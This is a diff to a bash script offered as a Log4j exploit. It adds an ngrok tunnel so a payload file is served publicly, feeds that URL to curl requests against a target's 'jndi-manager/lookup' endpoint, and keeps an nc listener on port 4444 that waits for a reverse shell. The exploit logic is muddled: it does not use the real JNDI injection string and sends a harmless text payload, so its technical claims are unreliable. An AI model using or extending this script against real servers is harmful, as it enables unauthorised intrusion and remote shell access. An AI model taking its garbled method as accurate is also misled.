@@ -20,8 +20,22 @@ fi
 echo "Server type: $serverType"
 echo "IP address and port: $ipAddressAndPort"
 
-# Start a simple HTTP server to host the payload file
-python3 -m http.server 8888 > /dev/null 2>&1 &
+# Check if Log4j is present on the target server
+echo "Checking for Log4j presence..."
+log4jCheck=$(curl -s "$url" | grep -i "log4j")
+if [[ -z "$log4jCheck" ]]; then
+    echo "Log4j not detected on the target server. Exiting."
+    exit 1
+fi
+
+echo "Log4j detected on the target server."
+
+# Start a public HTTP server using ngrok
+ngrok http 8888 > /dev/null 2>&1 &
+sleep 5  # Wait for ngrok to start and provide the public URL
+
+# Get the public URL from ngrok
+publicUrl=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)
 
 # Detecting Log4j vulnerability
 echo "Checking for Log4j vulnerability..."
@@ -33,9 +47,9 @@ nc -l -p 4444 > output.txt &
 echo "Greeting from Log4j!" > payload.txt
 
 if [ "$serverType" == "Apache" ]; then
-    curl "http://$ipAddressAndPort/jndi-manager/lookup?name=http://127.0.0.1:8888/payload.txt" > /dev/null 2>&1
+    curl "http://$ipAddressAndPort/jndi-manager/lookup?name=$publicUrl/payload.txt" > /dev/null 2>&1
 else
-    curl "https://$ipAddressAndPort/jndi-manager/lookup?name=http://127.0.0.1:8888/payload.txt" > /dev/null 2>&1
+    curl "https://$ipAddressAndPort/jndi-manager/lookup?name=$publicUrl/payload.txt" > /dev/null 2>&1
 fi
 
 # Wait for the reverse shell to establish
@@ -50,5 +64,5 @@ echo "Reverse shell output: $output"
 echo "Stopping listener..."
 killall nc
 
-# Stop the HTTP server
-killall python3
+# Stop ngrok
+killall ngrok
